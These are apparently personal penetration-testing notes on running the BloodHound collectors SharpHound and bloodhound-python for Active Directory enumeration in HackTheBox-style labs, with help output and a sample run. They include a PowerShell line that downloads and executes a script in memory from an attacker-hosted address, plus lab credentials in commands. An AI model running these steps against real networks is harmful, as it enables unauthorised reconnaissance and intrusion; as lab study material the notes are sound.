# SharpHound Ingestor/Collector

### Download
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors

### [Download and Run SharpHound.ps1 in Memory](#download-and-run-sharphoundps1-in-memory-1)

### Meaningful filename (use this)
```
.\SharpHound -c all --outputprefix HTB-Sauna
.\SharpHound.exe -c all --outputprefix HTB-Sauna
.\SharpHound.ps1 -c all --outputprefix HTB-Reel
Invoke-BloodHound -c all -outputprefix HTB-Reel
Invoke-BloodHound -c all -outputprefix THM-PostExploit
bloodhound-python -c all -u svc-alfresco -p s3rvice -d htb.local -ns $ip --zip
```

-----------------------

# Example

### [bloodhound-python -c all -u amanda -p Ashare1972 -d htb.local -ns $ip --zip](#bloodhound-python--c-all--u-amanda--p-ashare1972--d-htblocal--ns-ip---zip-1)

### Default filename (don't use this)
```
.\SharpHound -c all
.\SharpHound.exe -c all
```

### [SharpHound Community Edition](https://support.bloodhoundenterprise.io/hc/en-us/articles/17481151861019)

### Ingestor
[BloodHound.py](https://medium.com/@anastasisvasileiadis/bloodhound-py-v0-5-releases-a-python-based-ingestor-for-bloodhound-aa054771f4ff)

https://github.com/dirkjanm/BloodHound.py
```

```

### bloodhound-python produce output in json
--zip                 Compress the JSON output files into a zip archive
```
bloodhound-python -c all -u svc-alfresco -p s3rvice -d htb.local -ns $ip --zip
```

### BEFORE
```
PS C:\Users\tom\a> gcm | sls invoke-b
Invoke-BpaModel
```

### Download and Run SharpHound.ps1 in Memory
```
$ip = '10.1.1.1'
IEX(New-Object Net.WebClient).downloadString("http://$ip/SharpHound.ps1")
```

### AFTER
```
PS C:\Users\tom\a> IEX(New-Object Net.WebClient).downloadString("http://$ip/SharpHound.ps1")

PS C:\Users\tom\a> gcm | sls 
invoke-b
Invoke-BloodHound
Invoke-BpaModel
```
### 
```
Invoke-BloodHound -c all
```

### BEFORE & AFTER
```
PS C:\Users\Administrator> gcm Invoke-BloodHound
gcm : The term 'Invoke-BloodHound' is not recognized as the name of a cmdlet, function, script file, or        
operable program. Check the spelling of the name, or if a path was included, verify that the path is correct   
and try again.
At line:1 char:1
+ gcm Invoke-BloodHound
+ ~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Invoke-BloodHound:String) [Get-Command], CommandNotFoundExcept  
   ion
    + FullyQualifiedErrorId : CommandNotFoundException,Microsoft.PowerShell.Commands.GetCommandCommand
 
PS C:\Users\Administrator> iex(new-object net.webclient).downloadstring('http://10.1.1.1/SharpHound.ps1')
PS C:\Users\Administrator> gcm Invoke-BloodHound

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Function        Invoke-BloodHound


PS C:\Users\Administrator>
```

### Invoke-BloodHound -h
```
PS C:\a> Invoke-BloodHound -H
2023-09-09T00:33:17.1402414-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release o
f BloodHound
CommandLine 2.8.0
Copyright (c) 2005 - 2020 Giacomo Stelluti Scala & Contributors

  -c, --collectionmethods      (Default: Default) Collection Methods: Group, LocalGroup, LocalAdmin, RDP, DCOM,
                               PSRemote, Session, Trusts, ACL, Container, ComputerOnly, GPOLocalGroup,
                               LoggedOn, ObjectProps, SPNTargets, Default, DCOnly, All

  -d, --domain                 Specify domain to enumerate

  -s, --searchforest           (Default: false) Search all available domains in the forest

  --stealth                    Stealth Collection (Prefer DCOnly whenever possible!)

  -f                           Add an LDAP filter to the pregenerated filter.

  --distinguishedname          Base DistinguishedName to start the LDAP search at

  --computerfile               Path to file containing computer names to enumerate

  --outputdirectory            (Default: .) Directory to output file too

  --outputprefix               String to prepend to output file names

  --cachename                  Filename for cache (Defaults to a machine specific identifier)

  --memcache                   Keep cache in memory and don't write to disk

  --rebuildcache               (Default: false) Rebuild cache and remove all entries

  --randomfilenames            (Default: false) Use random filenames for output

  --zipfilename                Filename for the zip

  --nozip                      (Default: false) Don't zip files

  --zippassword                Password protects the zip with the specified password

  --trackcomputercalls         (Default: false) Adds a CSV tracking requests to computers

  --prettyprint                (Default: false) Pretty print JSON

  --ldapusername               Username for LDAP

  --ldappassword               Password for LDAP

  --domaincontroller           Override domain controller to pull LDAP from. This option can result in data    
                               loss

  --ldapport                   (Default: 0) Override port for LDAP

  --secureldap                 (Default: false) Connect to LDAP SSL instead of regular LDAP

  --disablecertverification    (Default: false) Disables certificate verification when using LDAPS

  --disablesigning             (Default: false) Disables Kerberos Signing/Sealing

  --skipportcheck              (Default: false) Skip checking if 445 is open

  --portchecktimeout           (Default: 500) Timeout for port checks in milliseconds

  --skippasswordcheck          (Default: false) Skip check for PwdLastSet when enumerating computers

  --excludedcs                 (Default: false) Exclude domain controllers from session/localgroup enumeration 
                               (mostly for ATA/ATP)

  --throttle                   Add a delay after computer requests in milliseconds

  --jitter                     Add jitter to throttle (percent)

  --threads                    (Default: 50) Number of threads to run enumeration with

  --skipregistryloggedon       Skip registry session enumeration
 
  --overrideusername           Override the username to filter for NetSessionEnum

  --realdnsname                Override DNS suffix for API calls

  --collectallproperties       Collect all LDAP properties from objects

  -l, --Loop                   Loop computer collection

  --loopduration               Loop duration (hh:mm:ss - 05:00:00 is 5 hours, default: 2 hrs)

  --loopinterval               Add delay between loops (hh:mm:ss - 00:03:00 is 3 minutes)

  --statusinterval             (Default: 30000) Interval in which to display status in milliseconds

  -v                           (Default: 2) Enable verbose output

  --help                       Display this help screen.

  --version                    Display version information.

PS C:\a>
```

### bloodhound-python -c all -u amanda -p Ashare1972 -d htb.local -ns $ip --zip
```
$ bloodhound-python -c all -u amanda -p Ashare1972 -d htb.local -ns $ip --zip
INFO: Found AD domain: htb.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (htb.local:88)] [Errno 110] Connection timed out
INFO: Connecting to LDAP server: sizzle.HTB.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: sizzle.HTB.LOCAL
INFO: Found 8 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: sizzle.HTB.LOCAL
INFO: User Guest is logged in on sizzle.HTB.LOCAL from 10.10.17.232
INFO: User Guest is logged in on sizzle.HTB.LOCAL from 10.10.14.15
WARNING: Could not resolve hostname to SID: 10.10.17.232
WARNING: Could not resolve hostname to SID: 10.10.14.15                                                                                                                
INFO: Done in 02M 41S                                                                                                                                                  
INFO: Compressing output into 20230911231644_bloodhound.zip
```
### 
```

```
### 
```

```